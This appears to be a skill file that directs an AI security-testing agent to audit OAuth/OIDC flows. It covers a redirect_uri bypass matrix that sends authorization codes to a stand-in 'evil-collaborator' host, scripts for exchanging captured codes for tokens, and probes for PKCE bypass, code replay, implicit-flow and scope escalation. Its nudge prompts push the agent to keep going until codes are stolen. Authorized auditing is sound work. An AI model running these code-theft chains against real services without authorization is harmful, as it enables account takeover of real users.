---
name: oauth_flow_audit
agent: agent4_auth
description: Audit OAuth/OIDC flows per client_id — redirect_uri validation, state CSRF, code/token leakage, PKCE enforcement, and implicit-flow leftovers.
---

# OAuth Flow Audit

## Purpose

OAuth/OIDC misconfigurations are a top-tier account-takeover class: a single loose `redirect_uri` check lets an attacker steal authorization codes and trade them for full account access, and missing PKCE turns public clients into open doors. This skill audits the complete authorization flow per discovered `client_id` — redirect validation, state handling, code/token leakage paths, PKCE enforcement, and leftover implicit flows. A confirmed `redirect_uri` bypass that leaks codes is a critical finding; PKCE downgrade and state-CSRF chain into one.

## Division of labor

- **Consumes:** discovered OAuth/OIDC endpoints and `client_id` values (from JS harvesting, `auth_model_mapping`, and `sso_config_leak` artifacts — especially `/.well-known/openid-configuration` contents), a test account, and a collaborator domain you control.
- **Produces:** `findings/oauth_flow_audit_confirmed.md` — per-client_id verdicts, the redirect_uri variant matrix results, and a working code-theft chain where confirmed.

## When to use / when NOT to use

- **Use when:** you found `/oauth/authorize`, `/authorize`, `/oauth2/*`, OIDC discovery docs, or `client_id` strings in JS/HTML; the app offers "Login with X" (first- or third-party IdP); you can register or observe an OAuth client.
- **Skip when (time-pass filter):** no OAuth/OIDC endpoints exist anywhere on the target (verify with a quick discovery-doc and JS-client_id grep first — absence must be evidenced, not assumed); the flow is purely server-to-server client-credentials with no user redirect (nothing to steal via redirect — one negative check, then move on).

## Methodology

1. **Enumerate the OAuth surface.** Fetch `/.well-known/openid-configuration`, `/oauth/.well-known/openid-configuration`, and grep all harvested JS for `client_id`, `authorize`, `redirect_uri`, `response_type`. Record every `client_id` + authorization endpoint + token endpoint pair.
2. **Baseline.** Request the authorization endpoint with garbage params (`client_id=dead`, `redirect_uri=https://dead.invalid`) and record the error behavior (400 JSON? redirect to a default? error page?). This is the comparison point for every variant.
3. **redirect_uri validation matrix.** For each real `client_id`, drive the authorize URL through these variants (with a valid `response_type=code`, `scope=openid`, and a fresh `state` each time). Record whether the server errors, redirects to the registered URI, or redirects to YOUR variant:
   1. exact registered URI (control — must work)
   2. registered URI + trailing path (`/callback/evil`)
   3. registered URI + query param (`/callback?evil=1`)
   4. subdomain of registered domain (`https://evil.<registered>/`)
   5. open-redirect prefix (`https://<registered>.evil.com/`)
   6. scheme swap (`http://` vs `https://`)
   7. `//evil.com` protocol-relative
   8. path traversal (`/callback/../..`)
   9. `https://evil.com?redirect_uri=<registered>` (parameter confusion)
   10. URL-encoded / double-encoded variants of the above
   11. `https://<registered>@evil.com/` (userinfo trick)
   12. localhost / 127.0.0.1 variants (some validators special-case these)
   - **If ANY variant causes a redirect to your domain WITH a `code` → proceed to step 4. If variants redirect without code, or error cleanly → record NEGATIVE per variant, continue to state/PKCE tests.**
4. **Prove code theft.** With the bypassing variant pointing at your collaborator domain, complete the login as your test account, capture the incoming `code` at your collaborator, then exchange it at the token endpoint for tokens. **If you get valid tokens → CONFIRMED critical account-takeover primitive. 2x reproduction with fresh codes.**
5. **state parameter.** Test: authorize request with NO state — accepted? With a fixed/predictable state — accepted? Reuse a state from a previous flow — accepted? Then test login-CSRF: craft an authorize URL with attacker state, and check whether completing it logs the VICTIM's browser into the ATTACKER's account (needs two sessions to verify cleanly).
6. **Code delivery confirmation.** When a code is issued, verify WHERE it goes: query param (leaks via Referer/logs) or fragment (stays client-side). Check the callback page for third-party resources — **a code in the query string on a page loading analytics = code leakage via Referer: CONFIRMED.**
7. **Implicit-flow leftovers.** Try `response_type=token` and `response_type=id_token+token` (and hybrid `code+token`). **If the server honors them and drops tokens into the URL fragment → implicit flow is live: high finding (tokens in fragment + browser history + Referer on fragment-stripping proxies).**
8. **PKCE enforcement.** For public clients: omit `code_challenge` entirely — is the flow still accepted? Send `code_challenge_method=plain` — accepted? Send a challenge, then exchange with a WRONG verifier — accepted? **If any of these succeed, PKCE is decorative: code-interception becomes practical.**
9. **Code replay and binding.** Use a code twice. Exchange a code with a DIFFERENT `redirect_uri` than the authorize request used. Exchange a code from a different session/IP. **Single-use and redirect_uri-bound are the claims — verify both.**
10. **Scope pollution.** Add scopes not in the original grant (`scope=openid+admin`, `scope=*`). **If the issued token carries elevated scopes → privilege-escalation finding.**
11. **postMessage token delivery.** If the callback uses `postMessage` to hand tokens to an opener, check the `targetOrigin`: `*` or attacker-controllable origin = token theft via malicious opener page.
12. **Client secret in public.** If the client is a SPA/mobile app (public client) but JS contains a `client_secret`, try the token exchange with it — **a leaked secret on a public client breaks the client-authentication assumption.**

## Exact commands

Discovery + baseline:

```bash
TARGET="https://<HOST>"
# OIDC discovery docs
for p in "/.well-known/openid-configuration" "/oauth/.well-known/openid-configuration" "/oauth2/.well-known/openid-configuration"; do
  echo "=== $p ==="
  curl -sk -w "HTTP %{http_code}\n" "$TARGET$p" -o "/tmp/oidc_$(echo $p | tr '/' '_').json"
done
# baseline: garbage client_id + dead redirect
curl -sk -i "$TARGET/oauth/authorize?client_id=dead123&redirect_uri=https://dead.invalid/cb&response_type=code&scope=openid&state=base1" \
  -o /tmp/oauth_baseline.txt -w "HTTP %{http_code} | %{time_total}s\n"
```

redirect_uri matrix driver (bash loop; inspect each response for a Location to your domain):

```bash
CID="<CLIENT_ID>"
REG="https://<REGISTERED_CALLBACK>"
EVIL="https://evil-collaborator.example/cb"
declare -a VARIANTS=(
  "$REG"
  "$REG/evil"
  "$REG?evil=1"
  "https://evil.<REGISTERED_DOMAIN>/"
  "https://<REGISTERED_DOMAIN>.evil-collaborator.example/"
  "http://<REGISTERED_HOST_AND_PATH>"
  "//evil-collaborator.example/cb"
  "$REG/../.."
  "https://evil-collaborator.example/?x=$REG"
  "https://<REGISTERED_DOMAIN>@evil-collaborator.example/"
)
i=0
for RU in "${VARIANTS[@]}"; do
  i=$((i+1))
  echo "=== variant $i: $RU ==="
  curl -sk -i --max-redirs 0 \
    "$TARGET/oauth/authorize?client_id=$CID&redirect_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$RU")&response_type=code&scope=openid&state=st$i" \
    -o "/tmp/oauth_ru_$i.txt" -w "HTTP %{http_code}\n"
  grep -i "^location:" "/tmp/oauth_ru_$i.txt" || echo "(no redirect)"
done
```

PKCE pair generator + wrong-verifier exchange test:

```bash
python3 - <<'EOF'
import secrets, hashlib, base64
verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
print("verifier:", verifier)
print("challenge:", challenge)
print("authorize url suffix: &code_challenge="+challenge+"&code_challenge_method=S256")
EOF
# exchange with the WRONG verifier after capturing a real code:
curl -sk -X POST "$TARGET/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=<CAPTURED_CODE>&redirect_uri=<USED_REDIRECT_URI>&client_id=<CID>&code_verifier=WRONGVERIFIER123" \
  -o /tmp/oauth_pkce_wrong.txt -w "HTTP %{http_code}\n"
# success here (tokens issued) -> PKCE not enforced: CONFIRMED
```

Code replay test:

```bash
# use the same code a second time (fresh request, identical body)
curl -sk -X POST "$TARGET/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=<CAPTURED_CODE>&redirect_uri=<USED_REDIRECT_URI>&client_id=<CID>&code_verifier=<REAL_VERIFIER>" \
  -o /tmp/oauth_replay.txt -w "HTTP %{http_code}\n"
```

Implicit-flow leftover probe:

```bash
curl -sk -i --max-redirs 0 \
  "$TARGET/oauth/authorize?client_id=<CID>&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('<REGISTERED_CALLBACK>',safe=''))")&response_type=token&scope=openid&state=impl1" \
  -o /tmp/oauth_implicit.txt -w "HTTP %{http_code}\n"
grep -i "^location:" /tmp/oauth_implicit.txt
# Location containing #access_token= -> implicit flow live: CONFIRMED
```

## Completion-bias defenses

- [ ] OAuth surface enumerated: every client_id + authorize/token endpoint pair recorded
- [ ] Baseline captured: garbage-client_id error behavior saved
- [ ] Full 12-variant redirect_uri matrix run PER client_id, Location header inspected per variant
- [ ] If bypass found: code captured at collaborator + exchanged for tokens, 2x reproduction with fresh codes
- [ ] state tested: missing, predictable, reuse, and login-CSRF with two sessions
- [ ] Code delivery path verified: query vs fragment; third-party resources on callback page checked for Referer leakage
- [ ] Implicit/hybrid response_types probed (token, id_token+token, code+token)
- [ ] PKCE tested: omitted challenge, plain method, wrong verifier
- [ ] Code replay tested (second use); redirect_uri binding tested (mismatched exchange); session/IP binding noted
- [ ] Scope pollution attempted
- [ ] postMessage targetOrigin checked where applicable
- [ ] Public-client secret leakage checked in JS
- [ ] Finished artifact exists: `findings/oauth_flow_audit_confirmed.md` with raw pairs
- **Review step:** agent10_review must verify: (a) redirect-bypass claims include the raw 302 Location header pointing at the collaborator WITH a code, plus the token-exchange response, (b) every matrix variant has a saved response file — no "probably safe" without evidence, (c) PKCE/replay claims show the exact exchange request and response twice, (d) all testing used operator-owned accounts and collaborator domains only.
- **Nudge prompts:**
  - "Keep going until all 12 redirect_uri variants have been tested for EVERY client_id you found, not just the first one — validators differ per client."
  - "A redirect to your domain without a code is not a finding and a 400 is not a fix — only a captured, exchanged code counts. Do not stop at the redirect."
  - "Do not report done before the finished artifact exists on disk with raw request/response pairs for every CONFIRMED and INCONCLUSIVE item."
- **Finished artifact definition:** `findings/oauth_flow_audit_confirmed.md` containing, per client_id, the variant matrix table (variant → observed behavior → response file), verdict, 2x reproduction log, and full raw request/response pairs for every CONFIRMED and INCONCLUSIVE item.

## Evidence standard

- Baseline: every variant compared against the garbage-client_id baseline captured first.
- Reproduction: 2x independent reproduction required — fresh authorize flow + fresh code each time for bypass claims.
- Raw evidence: full request/response pairs saved per variant; collaborator receipt logs for stolen codes.
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (e.g. cannot complete login to capture a code — needs human credentials) / NEGATIVE (dead end, documented so nobody re-tests it).

## Handoffs

- **sso_config_leak** is the upstream supplier: its mined tenant/client IDs and discovery docs seed this skill's client_id list — and this skill's findings flow back if new clients surface.
- **password_reset_poison** consumes confirmed account-takeover primitives — an OAuth code-theft chain composes with reset-link poisoning for targeted takeover.
- **agent5_business_logic** consumes scope-pollution and elevated-scope tokens as privilege-escalation primitives.
- **agent10_review** consumes `findings/oauth_flow_audit_confirmed.md` for the final gate.
